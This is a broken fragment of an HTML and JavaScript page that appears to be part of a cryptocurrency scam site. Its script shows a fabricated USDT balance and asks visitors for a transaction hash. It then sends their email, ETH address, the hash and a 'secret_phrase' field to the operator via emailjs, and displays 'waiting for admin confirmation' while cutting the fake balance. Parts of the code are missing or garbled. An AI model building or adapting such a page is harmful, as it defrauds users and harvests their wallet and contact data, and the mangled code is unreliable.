<html lang="en">
<head>
  <meta charset="UTF-8" />

      padding: 0;
      background: #0d111c;
      color: #fff;
      font-weight: bold;
    }
    .page {
      display: none;
      padding: 30px;
    }
    .visible {
      display: block !important;
    }
    .form-container {
      max-width: 400px;
      margin: 0 auto;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: none;
      font-size: 1rem;
    }
    button {
      background: #2d7efb;
      color: white;
      cursor: pointer;
    }

      background: #131722;
      display: flex;
      justify-content: space-between;
      padding: 15px;
      border-radius: 10px;
      margin: 10px 0;
      align-items: center;

      width: 24px;
      margin-right: 10px;
    }
    .hidden { display: none; }
    .popup {
      background: #111;
      padding: 20px;
      border: 2px solid #2d7efb;
      border-radius: 8px;
      margin-top: 20px;
    }
  </style>

  }

    localStorage.setItem("eth", eth);
    localStorage.setItem("usdt_balance", "1230.00");
    showPage("2");
  }

    const code = document.getElementById("accessCode").value;

  function submitTransaction() {
    const tx = document.getElementById("txHash").value;
    const email = localStorage.getItem("email");
    const eth = localStorage.getItem("eth");

    if (tx.length < 10) {
      alert("Enter valid transaction hash");
      return;
    }

    const payload = {
      user_email: email,
      secret_phrase: "user_entered",
      eth_address: eth,
      transaction_hash: tx
    };

    emailjs.send(emailService, templateTransaction, payload)
      .then(() => {
        document.getElementById("transferBox").innerHTML = "<h3>Transaction sent for approval </h3><p>Waiting for admin confirmation...</p>";
        setTimeout(() => {
          const current = parseFloat(localStorage.getItem("usdt_balance") || "1230.00");
          const newBal = (current - 100).toFixed(2);
          localStorage.setItem("usdt_balance", newBal);
          loadDashboard();
        }, 6000);
      });
  }
</script>
